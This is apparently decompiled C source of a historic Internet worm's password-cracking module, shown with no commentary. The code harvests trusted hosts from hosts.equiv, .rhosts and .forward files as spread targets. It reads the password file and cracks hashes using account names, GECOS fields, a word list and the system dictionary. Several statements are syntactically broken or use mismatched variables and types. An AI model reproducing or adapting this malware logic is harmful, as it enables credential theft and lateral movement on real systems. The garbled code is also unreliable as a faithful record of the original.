#include <pwd.h>

/* drive the state machine */
cracksome()
{
	switch (cmode) {
	case 0:
		crack_0();
		break;
	case 1:
		crack_1();	/* 3af0 */
		break;
	case 2:
		crack_2();	/* 3fe8 */
		break;
	case 3:
		crack_3();	/* 40f4 */
		break;
	default:
		break;
	}
}

struct muck {
	char name[16];
	char crypted[14];
	char passwd[18];		/* just a guess */
	char *home;
	char *gecos;
	struct muck *next;
};

crack_0()
{
	FILE	*fp;
	struct	host *hostp;
	struct	passwd *pwd, *getpwent();
	struct	muck *muckp;
	int	cnt;
	char	buf1[256], buf2[256], buf3[256];
	char	*bp, *p, *strcpy(), *malloc(), *index();

	/* read through hosts.equiv file for targets */
	fp = fopen(XS("/etc/hosts.equiv"), XS("r"));
	if (fp) {
		while (fscanf(fp, XS("%.100s"), buf1)) {
			/* see if new host */
			hostp = h_name2host(buf1, 0);
			if (hostp == NULL) {
				/* insert into host list */
				hostp = h_name2host(buf1, 1);
				/* get hostent structure */
				getaddrs(hostp);
			}
			/* if have an address, set flag */
			if ((int)hostp->addrs)
				(int) hostp->flags |= bit(3);
		}
		fclose(fp);
	}

	/* read through .rhosts file for targets */
	fp = fopen(XS("/.rhosts"), XS("r"));
	if (fp) {
		while (fgets(buf2, sizeof(buf2), fp) != 0) {
			if (sscanf(buf2, XS("%s"), buf1) != 1)
				continue;
			/* see if new host */
			hostp = h_name2host(buf1, 0);
			if (hostp == NULL) {
				/* insert into host list */
				hostp = h_name2host(buf1, 1);
				/* get hostent structure */
				getaddrs(hostp);
			}
			/* if have an address, set flag */
			if ((int)hostp->addrs)
				(int) hostp->flags |= bit(3);
		}
		fclose(fp);
	}

	/* read and store the password file */
	setpwent();
	cnt = 0;
	while (pwd = getpwent()) {
		if ((cnt++ % 10) == 0)
			other_sleep(0);
		sprintf(buf3, XS("%.200s/.forward"), pwd->pw_dir);
		fp = fopen(buf3, XS("r"));
		if (fp) {
			while (fgets(buf1, sizeof(buf1), fp) != 0) {
				bp = &buf1[strlen(buf1) - 1];
				*bp = '\0';
				p = index(buf1, '@');
				if (p == NULL)
					continue;
				p++;
				/* see if new host */
				hostp = h_name2host(p, 0);
				if (hostp == NULL) {
					/* insert into host list */
					hostp = h_name2host(f308, 1);
					/* get hostent structure */
					getaddrs(hostp);
				}
				/* if have an address, set flag */
				if ((int)hostp->addrs)
					(int) hostp->flags |= bit(3);
			}
			fclose(fp);
		}
		/* store password entry, don't overflow buffers */
		if (strlen(pwd->pw_name) > 11)
			continue;
		muckp = (struct muck *)malloc(sizeof(*muckp));
		strcpy(muckp->name, pwd->pw_name);
		if (strlen(pwd->pw_passwd) == 13)
			strcpy(muckp->crypted, pwd->pw_passwd);
		else
			strcpy(muckp->crypted, XS("x"));
		muckp->passwd[0] = '\0';
		muckp->home = strcpy(malloc(strlen(pwd->pw_dir) + 1),
			pwd->pw_dir);
		muckp->gecos = strcpy(malloc(strlen(pwd->pw_gecos) + 1),
			pwd->pw_gecos);
		muckp->next = xs_3;
		xs_3 = muckp;
	}
	endpwent();
	/* go to next state */
	cmode = 1;
	xs_4 = xs_3;
}

crack_1()
{
	int	f4;
	char	f36[32];
	char	f68[32];

	for (f4=0; xs_3 && f4 < 50; f4++, xs_3 = xs_3->next) {
		if ((f4 % 10) == 0)
			other_sleep(0);
		if (s_3d88(xs_4, XS("")) != 0)
			continue;
		if (strlen(xs_4->crypted) != 13)
			continue;
		strncpy(f36, xs_3->name, 31);
		if (s_3d88(xs_3->name, f36) != 0)
			continue;
		if (s_3d88(xs_3->name, f68) != 0)
			continue;
		sscanf(xs_3->gecos, XS("%[^ ,]"), f68);
		if (isupper(f68[0]))
			f68[0] = tolower(f68[0]);
		if (strlen(f68) > 3 && s_3d88(xs_3->name, f68) != 0)
			continue;
		f68[0] = 0;
		sscanf(xs_3->gecos, XS("%*s %[^ ,]s"), f68);
		if (isupper(f68[0]))
			f68[0] = tolower(f68[0]);
		if (strlen(f68) > 3 && index(f68, ',') == 0 &&
		    s_3d88(xs_3->name, f68) != 0)
			continue;
		s_3d40(f36, f68);
		s_3d88(xs_3->name, f68):
	}
	if (xs_3 == 0)
		cmode = 2;
	return 0;
}

extern	char **wds;

crack_2()
{
	struct	host *f4;
	int	f8;
	int	fc;

	if (wds[nextw] == 0) {
		cmode++;
		return;
	}
	if (nextw == 0) {
		for (f8 = 0; wds[f8]; f8++)
			;
		permute(wds, f8, 4);
	}
	for (fc = 0; wds[nextw][fc] != 0; fc++)
		wds[nextw][fc] &= ~0x80;
	for (f4 = xs_3; f4 != 0; f4 = f4->next)
		s_3d88(f4, wds[nextw]);
	for (fc = 0; wds[nextw][fc]; fc++)
		wds[nextw][fc] &= ~0x80;
	nextw++;
}

crack_3()
{
	extern	FILE *xs_5;	/* 0x2818 */
	char	f200[512];
	struct	muck *f204;
	char	*f208;

	if (xs_5 == 0) {
		xs_5 = fopen(XS("/usr/dict/words"), XS("r"));
		if (xs_5 == 0)
			return;
	}
	if (fgets(f200, sizeof(f200), xs_5) == 0) {
		cmode++;
		return;
	}
	f208 = &f200[strlen(f200)-1];
	*f208 = 0;
	for (f204 = xs_3; f204 != 0; f204 = f204->next)
		s_3d88(f204, f200);
	if (isupper(f200[0]))
		f200[0] = tolower(f200[0]);
	for (f204 = xs_3; f204 != 0; f204 = f204->next)
		s_3d88(f204, f200);
}
